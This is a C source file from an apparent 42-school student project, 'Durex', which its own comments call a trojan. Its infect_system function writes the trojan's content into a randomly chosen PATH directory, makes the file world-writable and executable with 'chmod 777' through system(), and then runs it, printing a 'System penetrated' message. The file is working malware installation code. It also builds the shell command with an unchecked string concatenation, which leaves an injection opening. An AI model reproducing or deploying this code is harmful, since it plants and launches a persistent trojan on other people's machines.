/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/10/17 01:14:40 by frmarinh          #+#    #+#             */
/*   Updated: 2017/10/17 01:14:42 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

/*
**	Execute the trojan after infection
*/
static void				execute_durex(char *path)
{
	char	chmod_buf[1024];

	ft_strcat((char*)&chmod_buf, "chmod 777 ");
	ft_strcat((char*)&chmod_buf, path);
	system(chmod_buf);
	system(path);
}

/*
**	Infect the system
*/
void					infect_system(t_durex *durex)
{
	t_env		*path			= find_env_key(durex, "PATH");
	int			fd				= 0;
	if (path) {
		char		**dirs			= ft_strsplit(path->value, ':');
		char		*chosen_path	= dirs[get_random(0, (ft_array_len(dirs) - 1))];
		chosen_path = ft_strjoin(chosen_path, "/Durex");

		unlink(chosen_path);
		get_durex_content(durex);
		if ((fd = open(chosen_path, O_RDWR | O_CREAT)) > 0) {
			write(fd, durex->content, durex->length);
			printf("System penetrated in %s (using a durex) - frmarinh/rjaguin\n", chosen_path);
			close(fd);
			
			execute_durex(chosen_path);
		}
	}
}
